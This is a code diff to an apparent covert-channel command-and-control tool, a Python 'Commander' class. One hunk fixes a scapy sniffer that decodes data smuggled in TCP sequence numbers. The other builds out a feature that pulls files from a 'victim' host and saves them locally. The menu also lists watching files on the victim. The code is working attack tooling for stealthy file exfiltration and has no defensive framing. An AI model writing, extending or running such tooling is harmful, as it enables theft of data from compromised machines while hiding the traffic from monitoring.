@@ -118,24 +118,25 @@ class Commander:
         print("="*50 + "\n")
 
     def start_output_listener(self):
-    """Continuous sniffer for the RX port to print covert data."""
-    self.output_buffer = ""  # Initialize buffer
-    def process_packet(pkt):
-        if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:
-            char_code = pkt[TCP].seq % 256
-            if char_code != 0:
-                with self.output_lock:
-                    self.output_buffer += chr(char_code)
+        """Continuous sniffer for the RX port to print covert data."""
+        self.output_buffer = ""  # Initialize buffer
 
-    try:
-        sniff(
-            filter=f"tcp dst port {self.rx_port}", 
-            prn=process_packet,
-            stop_filter=lambda x: not self.is_connected
-        )
-    except Exception as e:
-        if self.is_connected:
-            print(f"\n[!] Listener error: {e}")
+        def process_packet(pkt):
+            if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:
+                char_code = pkt[TCP].seq % 256
+                if char_code != 0:
+                    with self.output_lock:
+                        self.output_buffer += chr(char_code)
+
+        try:
+            sniff(
+                filter=f"tcp dst port {self.rx_port}", 
+                prn=process_packet,
+                stop_filter=lambda x: not self.is_connected
+            )
+        except Exception as e:
+            if self.is_connected:
+                print(f"\n[!] Listener error: {e}")
 
     def display_output(self, timeout=3):
         """Wait for and display buffered output."""
@@ -253,15 +254,79 @@ class Commander:
         time.sleep(0.3)
 
     def handle_get_file(self):
-        """Option 6: Transfer a file FROM the victim."""
+        """Option 6: Transfer a file FROM the victim and save locally."""
         filename = input("Remote file to download: ").strip()
         if not filename:
             print("[!] No file specified.")
             return
+        
+        # Clear output buffer before transfer
+        with self.output_lock:
+            self.output_buffer = ""
+        
+        # Generate local save path
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        save_dir = "./transferred_files"
+        os.makedirs(save_dir, exist_ok=True)
+        
+        # Extract just the filename from path
+        remote_filename = os.path.basename(filename)
+        save_path = f"{save_dir}/{remote_filename}_{timestamp}"
+        
         print(f"[*] Requesting {filename} from victim...")
         self.send_covert_command("GET", filename)
-        print("\n[*] Waiting for file data (output will appear above)...")
-        time.sleep(1)
+        
+        # Wait for data with longer timeout for files
+        print(f"[*] Waiting for file transfer...")
+        start_time = time.time()
+        last_buffer_len = 0
+        timeout = 30  # Increased timeout for file transfers
+        
+        while time.time() - start_time < timeout:
+            time.sleep(0.3)
+            with self.output_lock:
+                current_len = len(self.output_buffer)
+                if current_len == last_buffer_len and current_len > 0:
+                    # Check if transfer complete marker received
+                    if "=== FILE TRANSFER COMPLETE ===" in self.output_buffer:
+                        break
+                    # No new data for 0.3 seconds
+                    if last_buffer_len > 0:
+                        break
+                last_buffer_len = current_len
+        
+        # Save the received data to file
+        with self.output_lock:
+            if self.output_buffer:
+                # Extract just the file content (strip markers)
+                content = self.output_buffer
+                content = content.replace("=== FILE TRANSFER START ===\n", "")
+                content = content.replace("=== FILE CONTENT ===\n", "")
+                content = content.replace("=== FILE TRANSFER COMPLETE ===\n", "")
+                
+                # Remove header lines
+                lines = content.split('\n')
+                content_lines = []
+                skip_header = True
+                for line in lines:
+                    if line.startswith("Filename:") or line.startswith("Size:"):
+                        continue
+                    if skip_header and line == "":
+                        continue
+                    skip_header = False
+                    content_lines.append(line)
+                content = '\n'.join(content_lines)
+                
+                with open(save_path, "w") as f:
+                    f.write(content)
+                
+                print(f"\n[+] File transferred and saved to: {save_path}")
+                print(f"[+] Total bytes received: {len(content)}")
+                self.output_buffer = ""
+            else:
+                print("\n[!] No file data received")
+        
+        print("="*50 + "\n")
 
     def handle_watch(self):
         """Option 7: Watch a file/directory on the victim."""
